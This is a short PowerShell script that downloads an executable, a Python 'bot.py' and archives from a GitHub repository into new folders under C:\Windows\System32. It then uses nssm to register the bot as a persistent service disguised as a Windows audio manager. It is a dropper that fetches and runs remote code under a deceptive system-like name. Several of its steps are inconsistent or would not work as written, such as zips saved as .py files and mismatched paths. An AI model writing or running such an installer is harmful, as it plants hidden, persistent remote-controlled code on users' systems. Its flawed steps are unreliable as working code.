$destino = 'C:\Windows\System32\ap32\nssm.exe'
$destino2 = 'C:\Windows\System32\ap32\bot.py'
$destino3 = 'C:\Windows\System32\re-as\WPy64.zip.py'
$destino4 = 'C:\Windows\System32\re-as\WPy64.zip_2.py'
$destino5 = 'C:\Windows\System32\ap32\Res-PE\scripts.py'

New-Item -Path "C:\Windows\System32\re-as" -ItemType Directory
New-Item -Path "C:\Windows\System32\ap32" -ItemType Directory
New-Item -Path "C:\Windows\System32\ap32\Res-PE" -ItemType Directory

Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/blob/e49df34ce06397107e3fa8879974a7d4d6009f76/nssm.exe?dl=1" -OutFile $destino
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/bot.py?dl=1" -OutFile $destino2
Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/blob/e49df34ce06397107e3fa8879974a7d4d6009f76/WPy64.zip?dl=1" -OutFile $destino3
Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/blob/e49df34ce06397107e3fa8879974a7d4d6009f76/WPy64_2.zip?dl=1" -OutFile $destino4
Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/blob/e49df34ce06397107e3fa8879974a7d4d6009f76/scripts.zip?dl=1" -OutFile $destino5

Expand-Archive -Path $destino3 -DestinationPath "C:\Windows\System32\ap32" -Force
Expand-Archive -Path $destino4 -DestinationPath "C:\Windows\System32\ap32" -Force
Expand-Archive -Path $destino5 -DestinationPath "C:\Windows\System32\ap32\Res-PE" -Force

"$destino" install "Gestor Primario de Audio do Windows" "C:\Windows\System32\re-as\WPy64\python\python.exe C:\Windows\System32\ap32\bot.py"
"$destino" restart "Gestor Primario de Audio do Windows"
exit